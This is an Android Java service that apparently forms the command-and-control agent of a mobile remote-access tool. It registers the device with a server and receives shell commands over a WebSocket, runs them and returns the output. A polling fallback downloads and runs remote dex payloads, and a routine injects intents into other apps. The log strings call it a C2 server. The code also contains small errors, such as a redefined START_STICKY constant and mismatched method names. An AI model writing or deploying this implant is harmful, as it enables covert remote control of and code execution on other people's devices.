package com.mobilemorph.agent.services;
import android.app.Service;
import android.content.Intent;
import android.content.Context;
import android.content.ComponentName;
import android.content.SharedPreferences;
import android.os.IBinder;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;
import org.json.JSONObject;
import java.util.Iterator;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
// Include your custom utility classes if available
import com.mobilemorph.agent.utils.*;
import io.socket.client.IO;
import io.socket.client.Socket;
import org.json.JSONObject;

public class CommandService extends Service {
    private static final String TAG = "CommandService";
    private static final String SERVER_URL = "http://127.0.0.1:5000"; // HTTPS support enabled
    private static boolean  isRunning = false;
    private static final int START_STICKY = 0;
    private String deviceId;
    private Socket mSocket;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "CommandService started");

        // Device ID must be fetched from context
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        registerWithServer();

        // Start WebSocket connection
        setupWebSocket(SERVER_URL, deviceId);

        // Optionally keep polling logic here
        // startPollingLoop();

        return START_STICKY;
    }

    private void setupWebSocket(String serverUrl, String deviceId) {
        try {
            mSocket = IO.socket(serverUrl);
            mSocket.on(Socket.EVENT_CONNECT, args -> {
                Log.d("WS", "Connected");
                mSocket.emit("register", deviceId);
            });
            mSocket.on("command", args -> {
                String cmd = (String) args[0];
                Log.d("WS", "Received command: " + cmd);
                String result = ShellExecutor.execute(cmd);
                JSONObject response = new JSONObject();
                try {
                    response.put("device_id", deviceId);
                    response.put("output", result);
                    mSocket.emit("command_result", response);
                } catch (Exception e) {
                    Log.e("WS", "JSON error", e);
                }
            });
            mSocket.connect();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void registerWithServer() {
        try {
            // Avoid re-registration
            SharedPreferences prefs = getSharedPreferences("agent_prefs", MODE_PRIVATE);
            if (prefs.getBoolean("registered", false)) return;
            JSONObject payload = new JSONObject();
            payload.put("device_id", deviceId);
            payload.put("manufacturer", Build.MANUFACTURER);
            payload.put("rooted", false); // You can replace with a root check later
            URL url = new URL(SERVER_URL + "/register");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            OutputStream os = conn.getOutputStream();
            os.write(payload.toString().getBytes());
            os.flush();
            os.close();
            int code = conn.getResponseCode();
            if (code == 200) {
                prefs.edit().putBoolean("registered", true).apply();
                Log.d(TAG, "Agent reigstered with server.");
            } else {
                Log.e(TAG, "Registration failed: " + code);
            }
        } catch (Exception e) {
            Log.e(TAG, "registerWithServer() failed", e);
        }
    }

    // Polling logic (option fallback)
    private void startingPollingLoop() {
        new Thread(() -> {
            while (true) {
                try {
                    JSONObject cmd = fetchCommand();
                    if (cmd != null) {
                        String type = cmd.optString("type");
                        String payload = cmd.optString("payload");
                        String output = "";
                        switch (type) {
                            case "exec":
                                output = ShellExecutor.execute(payload);
                                break;
                            case "dexload":
                                DexLoader.loadAndExecute(getApplicationContext(), payload);
                                output = "Executed dex payload: " + payload;
                                break;
                            case "update_payload":
                                String url = cmd.optString("url");
                                String path = cmd.optString("path");
                                PayloadUpdater.updateAndLoad(getApplicationContext(), url, path);
                                output = "Updated and executed dex payload from: " + url;
                                break;
                            case "sleep":
                                Thread.sleep(Long.parseLong(payload));
                                output = "Slept for " + payload + " ms";
                                break;
                            default:
                                output = "Unknown command type: " + type;
                                break;
                        }

                        postOutput(output);
                    }

                    Thread.sleep(10000);
                } catch (Exception e) {
                    Log.e(TAG, "Error in command loop", e);
                }
            }
        }).start();
    }

    private JSONObject fetchCommand() {
        try {
            URL url = new URL(SERVER_URL + "/get_command/" + deviceId);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");

            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }

            return new JSONObject(response.toString());
        } catch (Exception e) {
            Log.e(TAG, "fetchCommand() failed", e);
            return null;
        }
    }

    private void postOutput(String output) {
        try {
            URL url = new URL(SERVER_URL + "/post_output");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);

            JSONObject payload = new JSONObject();
            payload.put("device_id", deviceId);
            payload.put("output", output);

            OutputStream os = conn.getOutputStream();
            os.write(payload.toString().getBytes());
            os.flush();
            os.close();

            conn.getResponseCode();
        } catch (Exception e) {
            Log.e(TAG, "postOutput() failed", e);
        }
    }

    private void handleIntentInjection(JSONObject args) {
        try {
            String pkg = args.getString("package");
            String component = args.optString("component", pkg + ".MyReceiver");
            String action = args.optString("action", "android.intent.action.SEND");

            JSONObject extras = args.optJSONObject("extras");
            Intent intent = new Intent(action);
            intent.setComponent(new ComponentName(pkg, pkg + component));

            if (extras != null) {
                Iterator<String> keys = extras.keys();
                while (keys.hasNext()) {
                    String key = keys.next();
                    Object value = extras.get(key);
                    if (value instanceof Boolean) {
                        intent.putExtra(key, (Boolean) value);
                    } else if (value instanceof Integer) {
                        intent.putExtra(key, (Integer) value);
                    } else {
                        intent.putExtra(key, value.toString());
                    }
                }
            }

            getApplicationContext().sendBroadcast(intent);
            sendResult("Intent injection sent to: " + pkg + component);
        } catch (Exception e) {
            sendResult("Error during intent injection: " + e.getMessage());
        }
    }

    private String getDeviceId() {
        return android.provider.Settings.Secure.getString(
            getApplicationContext().getContentResolver(),
            android.provider.Settings.Secure.ANDROID_ID
        );
    }

    private void sendResult(String message) {
        try {
		    JSONObject result = new JSONObject();
		    result.put("device_id", getDeviceId());
		    result.put("result", message);
		    mSocket.emit("command_result", result);
	    } catch (Exception e) {
		    e.printStackTrace();
	    }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isRunning = false;
        Log.d(TAG, "CommandService stopped.");
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public static void startServer(Context ctx, int port) {
        Log.d("CommandService", "Starting C2 server on port: " + port);
        Intent intent = new Intent(ctx, CommandService.class);
        ctx.startService(intent);
    }

    public static void stopServer(Context ctx) {
        Log.d("CommandService", "Stopping C2 server");
        Intent intent = new Intent(ctx, CommandService.class);
        ctx.stopService(intent);
    }
}
